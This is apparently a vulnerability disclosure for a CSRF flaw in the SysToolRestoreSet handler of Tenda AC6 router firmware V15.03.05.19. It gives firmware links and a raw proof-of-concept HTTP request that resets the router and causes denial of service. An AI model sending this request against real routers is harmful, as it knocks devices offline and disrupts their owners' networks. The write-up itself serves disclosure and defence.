# Tenda AC6V1.0 V15.03.05.19 is vulnerable to Cross Site Request Forgery (CSRF) via function fromSysToolRestoreSet

## Description

`Tenda`  Router **AC6V1.0 V15.03.05.19** is vulnerable to Cross Site Request Forgery (CSRF) via function `fromSysToolRestoreSet`

## Firmware information

* Manufacturer's address: https://www.tenda.com.cn/

* Firmware download address : https://www.tenda.com.cn/download/detail-2681.html

## Affected version

![](images/01.png)

## Vulnerability details

This vulnerability lies in the `/goform/fromSysToolRestoreSet` page，The details are shown below:

![image-20221121111658343](images/02.png)

![image-20221121111732242](images/03.png)

## POC

This POC can result in a Dos.

```
GET /goform/SysToolRestoreSet HTTP/1.1
Host: 192.168.204.133
Content-Length: 11525
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.204.133
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.204.133/system_hostname.asp?version=1487847846
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: bLanguage=cn; password=jbl1qw; user=
Connection: close
```

![image-20221121111620471](images/04.png)